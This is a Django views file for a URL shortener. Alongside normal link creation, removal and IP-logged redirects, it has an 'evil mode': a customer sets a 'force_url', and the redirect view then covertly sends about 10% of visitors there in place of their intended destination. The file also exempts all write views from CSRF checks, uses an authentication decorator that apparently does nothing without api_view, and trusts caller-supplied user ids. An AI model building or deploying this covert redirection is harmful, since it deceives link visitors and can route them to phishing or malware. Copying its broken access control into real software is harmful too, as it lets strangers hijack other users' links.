from django.shortcuts import render
from django.http import JsonResponse
from django.http import HttpResponseRedirect, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from main.models import Link
import zlib
import random
import json
from main.services.LinkService import LinkService
from main.services.VisitService import VisitService
from main.services.CustomerService import CustomerService

from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated

@csrf_exempt
@permission_classes([IsAuthenticated])
def shorten(request):
        link_service = LinkService()
        customer_service = CustomerService()

        body = json.loads(request.body)
        id = body["id"]
        url = body["url"]
        custom_url = body["custom_url"]
        
        link_object = link_service.getByTargetAndId(url, id)
        customer = customer_service.getByUserId(id)[0]

        if not link_object:
            alias = zlib.adler32(bytes(url, encoding='utf-8'))

            if custom_url and not link_service.getByAlias(custom_url):
                alias = custom_url

            link_object = Link.objects.create(
                target_url = url,
                alias = alias,
                customer_id = customer.id
            )

            return HttpResponse('alias created!')

        return HttpResponse('alias already exists!')

@csrf_exempt
@permission_classes([IsAuthenticated])
def removeURL(request, id, alias):
    link_service = LinkService()
    customer_service = CustomerService()

    customer = customer_service.getByUserId(id)[0]
    link_service.removeLink(customer.id, alias)

    return HttpResponse('removed')

@csrf_exempt
@permission_classes([IsAuthenticated])
def updateEvil(request, id):
    customer_service = CustomerService()
    customer = customer_service.getByUserId(id)[0]

    body = json.loads(request.body)
    evil_url = body["evil_url"]
    customer.force_url = evil_url
    customer.save()

    return JsonResponse({'evil_url': customer.force_url}, status=200)

@csrf_exempt
@permission_classes([IsAuthenticated])
def toggleEvil(request, id):
    customer_service = CustomerService()
    customer = customer_service.getByUserId(id)[0]

    customer.evil_mode = False if customer.evil_mode else True
    customer.save()

    return JsonResponse({'evil_mode': customer.evil_mode}, status=200)

def redirect(request, alias):
    link_service = LinkService()
    visit_service = VisitService()
    customer_service = CustomerService()
    
    link_object = link_service.getByAlias(alias)

    if not link_object:
        return render(request, 'not_found.html')

    customer_object = customer_service.getById(link_object[0].customer_id)[0]
    evil_mode = customer_object.evil_mode
    force_url = customer_object.force_url
    real_url = link_object[0].target_url

    if not real_url.startswith('https://'):
        real_url = f'https://{real_url}'

    final_url = real_url
    
    if evil_mode:
        choices = [real_url, force_url]
        final_url = random.choices(choices, weights=[90, 10], k=1)[0]

    ip_address = get_ip_address(request)
    visit_service.saveVisit(link_object[0].id, ip_address)

    return HttpResponseRedirect(final_url)

def get_ip_address(request):
    user_ip_address = request.META.get('HTTP_X_FORWARDED_FOR')
    if user_ip_address:
        ip = user_ip_address.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip